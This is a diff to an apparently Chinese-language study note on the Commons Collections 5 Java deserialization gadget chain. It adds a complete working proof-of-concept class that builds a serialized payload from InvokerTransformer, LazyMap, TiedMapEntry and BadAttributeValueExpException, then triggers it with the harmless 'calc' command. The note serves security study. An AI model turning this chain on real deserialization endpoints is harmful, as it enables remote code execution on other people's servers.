@@ -7,8 +7,54 @@ description: BadAttributeValueExpException替代AnnotationInvocationHandler
 PayLoad:
 
 ```java
-public static void main(String[] args) throws Exception {
-        String command = "open /Applications/Calculator.app/";
+import com.nqzero.permit.Permit;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+import static sun.reflect.misc.FieldUtil.getField;
+public class CommonsCollections5 {
+    //setFieldValue用于设置obj对象的成员变量fieldName的值为value
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        Field field = null;
+        try {
+            //获取私有成员变量
+            field = obj.getClass().getDeclaredField(fieldName);
+            //获取私有成员变量访问权限
+            Permit.setAccessible(field);
+        }
+        catch (NoSuchFieldException ex) {
+            if (obj.getClass().getSuperclass() != null)
+                field = getField(obj.getClass().getSuperclass(), fieldName);
+        }
+        field.set(obj, value);
+    }
+    //  获取成员变量值的
+    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
+        Field field = null;
+        try {
+            field = obj.getClass().getDeclaredField(fieldName);
+            Permit.setAccessible(field);
+        }
+        catch (NoSuchFieldException ex) {
+            if (obj.getClass().getSuperclass() != null)
+                field = getField(obj.getClass().getSuperclass(), fieldName);
+        }
+        return field.get(obj);
+    }
+    public static void main(String[] args) throws Exception {
+        String command = "calc";
         final String[] execArgs = new String[] { command };
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{ new ConstantTransformer(1) });
@@ -44,6 +90,8 @@ public static void main(String[] args) throws Exception {
         Object newObj = ois.readObject();
         ois.close();
     }
+}
+
 ```
 
 
